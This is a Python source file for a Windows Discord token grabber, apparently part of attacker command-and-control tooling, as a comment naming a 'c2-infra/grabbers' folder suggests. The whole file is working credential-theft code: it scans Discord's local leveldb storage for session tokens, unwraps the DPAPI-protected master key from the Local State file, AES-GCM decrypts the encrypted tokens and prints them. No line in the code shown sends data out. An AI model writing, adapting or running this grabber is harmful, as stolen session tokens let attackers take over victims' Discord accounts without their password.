import os
import re
import json 
import base64
from re import findall
from Crypto.Cipher import AES 
from win32crypt import CryptUnprotectData 

discord_leveldb_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
#discord_path = "~/c2-infra/grabbers/discord_token/files2"
local_state_path = os.path.join(os.getenv("APPDATA"), "discord", "Local State")

def grab_tokens():
    tokens=""

    old_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    mfa_regex = re.compile(r"mfa\.[\w-]{84}")
    #encrypted_regex = re.compile(r"(dQw4w9WgXcQ:)([^\"']+)")
    encrypted_regex = re.compile(r"dQw4w9WgXcQ:([\w+/=]+)")

    print(f"[*] discord leveldb path: {discord_leveldb_path}\n")

    for file_name in os.listdir(discord_leveldb_path):
        if not file_name.endswith(".ldb"):
            continue
            #return 0

        file_path = os.path.join(discord_leveldb_path, file_name)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
            content = file.read()

        if match := old_regex.search(content):
            print(f"[+] old regex found: {match.group(0)}\n")
            tokens += match.group(0) + "\n"
        if match := mfa_regex.search(content):
            print(f"[+] mfa regex found: {match.group(0)}\n")
            tokens += match.group(0) + "\n"
        if match := encrypted_regex.search(content):
            encrypted_token = match.group(1)
            print(f"[+] encrypted regex found: {encrypted_token}\n")
            decrypted_token = decrypt_token(base64.b64decode(encrypted_token), decrypt_key())
            tokens += decrypted_token + "\n"
    return tokens

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_key():
    print(f"[*] Local State path: {local_state_path}\n")
    with open(local_state_path, "r", encoding="utf-8") as file:
        data = json.load(file)
    
    print(f"[*] raw Local State: {data}\n")
    encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
    print(f"[*] encrypted_key: {encrypted_key}\n")
    encrypted_key = encrypted_key[5:]
    print(f"[*] encrypted_key (without DPAPIs first 5 bytes): {encrypted_key}\n")
    
    decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    print(f"[+] decrypted key: {decrypted_key}\n")
    return decrypted_key

def decrypt_token(buffer, encrypted_key):
    try:
        iv = buffer[3:15]
        print(f"[*] iv: {iv}")
        payload = buffer[15:]
        print(f"[*] payload: {payload}")
        cipher = generate_cipher(encrypted_key, iv)
        print(f"[*] cipher: {cipher}\n")
        decrypted_key = decrypt_payload(cipher, payload)
        print(f"[*] raw decrypted token: {decrypted_key}\n")
        decrypted_key = decrypted_key[:-16].decode()
        print(f"[+] decrypted token: {decrypted_key}\n")
        return decrypted_key
    except:
        return "err"

    #key = decrypt_key()
    #nonce = buffer[3:15]
    #cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    #decrypted_data = cipher.decrypt(buffer[15:])
    #print(f"[*] decrypted_data: {decrypted_data}\n")
    ##print(f"[*] decrypted_data: {decrypted_data.decode('utf-8'.rstrip('\r\n\0'))}")
    #try:
    #    decoded_text = decrypted_data.decode("utf-8")
    #    print(f"[*] Decrypted Data (UTF-8): {decoded_text}")
    #except UnicodeDecodeError:
    #    print("[!] Decrypted data is not valid UTF-8 text, printing raw bytes:")
    #    print(decrypted_data.hex())
    #    decoded_text = decrypted_data
    #return decoded_text
    #return decrypted_data.decode("utf-8".rstrip("\r\n\0"))

if __name__ == "__main__":
    print("[+] started....\n")
    print(grab_tokens())
